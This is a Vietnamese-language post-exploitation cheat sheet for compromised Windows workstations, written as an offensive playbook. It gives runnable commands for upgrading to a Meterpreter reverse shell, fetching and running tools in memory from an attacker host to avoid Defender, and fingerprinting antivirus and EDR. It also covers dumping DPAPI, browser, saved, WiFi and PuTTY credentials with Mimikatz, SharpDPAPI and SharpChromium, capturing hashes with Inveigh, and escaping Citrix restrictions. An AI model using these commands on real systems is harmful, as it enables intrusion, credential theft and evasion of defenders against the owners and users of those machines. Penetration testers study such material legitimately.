Chúc mừng, bạn đã có một phiên làm việc (Session) trên máy trạm. Dù là WinRM hay RDP, mục tiêu lúc này là: Vét sạch thông tin nhạy cảm và trinh sát môi trường mà không làm động hệ thống phòng thủ.

### **1. Nâng cấp shell**

Nâng cấp shell lên Meterpreter Shell để dùng đa luồng cũng như module của **Metasploit**.

* **Web Delivery (Bypass Disk):** Payload được thực thi qua PowerShell, không ghi file xuống ổ cứng.

```bash
sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP_máy_tấn_công>; set LPORT 4444; exploit"
```

* **SMB Delivery:** Lừa máy nạn nhân truy cập vào một share SMB do ta kiểm soát để tải DLL độc hại.

```bash
use exploit/windows/smb/smb_delivery
```

### **2. Trinh sát môi trường**

Trước hết ta phải biết mình đang đứng ở đâu và ai đang canh gác.

* **Kiểm tra AV/EDR/SOC:**

```bash
# Xem danh sách tiến trình để đoán AV (ví dụ: msmpeng.exe là Defender)
tasklist /v
# Dùng NetExec
nxc smb <IP_mục_tiêu> -M enum_av
```

* **Bypass Execution Policy:** Để chạy các script .ps1

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

* **Kiểm tra UAC:**

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

* **Fileless:** Chạy script bằng cách nạp trực tiếp vào RAM sẽ tránh được việc bị Defender vồ.

```powershell
# Với .ps1
IEX (New-Object Net.WebClient).DownloadString('http://<IP_máy_tấn_công>/PowerView.ps1')
# Với .exe
$data = (New-Object System.Net.WebClient).DownloadData('http://<IP_máy_tấn_công>/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[SharpHound3.SharpHound]::Main(@("All"))
```

* **Xác định vị trí mạng:** Đôi khi máy trạm bạn chiếm được có kết nối tới các dải mạng ngầm mà máy tấn công không quét thấy. Đây là bước chuẩn bị cho việc Tunneling/Pivoting sau này.

```powershell
# Xem cấu hình các card mạng
ipconfig /all
# Xem bảng ARP để tìm các máy hàng xóm
arp -a
# Kiểm tra các kết nối mạng hiện tại (tìm dấu vết quản trị từ xa)
netstat -ano
```

### **3. Looting**

* **DPAPI & Browser:** Trích xuất Master Key để giải mã mật khẩu trình duyệt, WiFi.
  Dùng Mimikatz lấy Master Key: ```.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit```.
  Hoặc SharpDPAPI: ```.\SharpDPAPI.exe passwords```.
* **Cmdkey Saved Credentials:** Windows cho phép lưu mật khẩu để tự động đăng nhập.

```powershell
cmdkey /list
# Dùng tài khoản được lưu bằng runas
runas /savecred /user:<user> "cmd.exe"
```

* **Dùng SharpChromium:** ```.\SharpChromium.exe all``` để lấy cookies, lịch sử và mật khẩu trình duyệt.
* **Kiểm tra mật khẩu đăng nhập tự động:**

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

* **Kiểm tra mật khẩu Putty:**

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

* **Mật khẩu WiFi:**: ```netsh wlan show profile <name> key=clear```
* **Khai thác nhật ký & lịch sử:** Lịch sử Powershell và Security Log (ID 4688)

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
wevtutil qe Security /rd:true /f:text | Select-String "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 }
```

Ngoài những mật khẩu trên ta cần xem xét cả các file cấu hình của các ứng dụng bên thứ 3 được cài trên máy.

### **4. SharpHound**

Khi bạn chạy trực tiếp **SharpHound** trên một máy trạm, dữ liệu sẽ chi tiết hơn so với **NetExec** và **bloodhound-python**.

```powershell
.\SharpHound.exe all
# SharpHound còn có bản .ps1
```

### **5. Nghe lén nội bộ với Inveigh**
Tương tự với **Responder** nhưng mạnh hơn. Bản C# ít bị soi hơn bản PowerShell. Nó giúp bạn bắt Hash mà không cần can thiệp vào cấu hình mạng của DC.

```powershell
.\Inveigh.exe
```

### **6. Citrix & Môi trường bị hạn chế**

* **Bypass Path:** Dùng hộp thoại Open/Save của Paint hoặc Notepad để duyệt ổ C: qua đường dẫn UNC ```\\127.0.0.1\c$\```.
* **Modify Shortcut:** Sửa mục tiêu (Target) của một shortcut có sẵn để trỏ về cmd.exe.
* **Script Execution qua đuôi lạ:** Nếu .bat bị chặn, hãy thử .vbs, .js hoặc thậm chí là .hta qua mshta.exe.
